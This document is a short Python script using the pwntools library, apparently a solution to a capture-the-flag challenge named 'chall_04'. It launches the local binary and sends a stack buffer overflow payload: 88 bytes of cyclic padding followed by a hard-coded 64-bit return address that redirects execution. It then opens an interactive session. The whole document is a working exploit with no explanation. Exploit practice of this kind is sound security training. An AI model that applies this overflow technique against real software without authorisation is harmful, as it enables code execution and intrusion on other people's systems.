# coding: utf-8
from pwn import *
p = process("./chall_04")
p.recv()
payload = cyclic(88) + p64(0x00401176)
p.sendline(payload)
p.interactive()
